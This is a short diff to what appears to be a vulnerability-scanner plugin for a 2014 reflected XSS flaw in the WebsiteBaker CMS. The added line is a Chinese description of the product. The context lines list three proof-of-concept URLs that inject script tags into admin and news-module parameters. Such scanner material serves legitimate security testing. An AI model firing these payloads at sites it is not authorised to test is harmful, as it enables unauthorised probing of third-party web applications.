@@ -19,6 +19,7 @@ class Vuln(ABVuln):
     type = VulnType.XSS  # 漏洞类型
     disclosure_date = '2014-01-17'  # 漏洞公布时间
     desc = '''
+        WebsiteBaker可帮助您创建所需的网站：免费，简单，安全，灵活且可扩展的开源内容管理系统（CMS）。
         /wb/admin/admintools/tool.php?tool=captcha_control&6d442"><script>alert(1)</script>8e3b12642a8=1
         /wb/modules/news/add_post.php?page_id=1&section_id=f953a"><script>alert(1)</script>4ddf3369c1f
         /wb/modules/news/modify_group.php?page_id=1&section_id="><script>alert(1)</script>2680504c3ec&group_id=62be99873b33d1d3
